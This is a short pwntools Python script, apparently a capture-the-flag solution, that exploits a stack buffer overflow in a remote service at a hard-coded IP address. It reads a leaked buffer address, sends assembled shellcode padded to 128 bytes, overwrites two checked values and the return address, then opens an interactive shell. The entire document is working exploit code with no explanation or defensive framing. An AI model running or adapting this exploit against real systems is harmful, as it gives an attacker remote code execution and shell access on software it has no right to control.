from pwn import *
context.arch = 'i386'
context.os = 'linux'

#conn = remote('localhost', 4444)
conn = remote('54.210.15.77', 1259)
msg = conn.recvline()
bufaddr = int(msg[msg.find(":")+2:], 16)

#print shellcraft.i386.linux.sh()
scfile = open("shellc.asm", "r")
sc = scfile.read()
shellcode = asm(sc)

payload = shellcode
payload += "A"*(128 - len(shellcode))
payload += pack(0x475a31a5) + pack(0x40501555)
payload += "B"*12
payload += pack(bufaddr)
conn.sendline(payload)
conn.interactive()

# 0x08048583 - after scanf
# 0x080485c1 - success state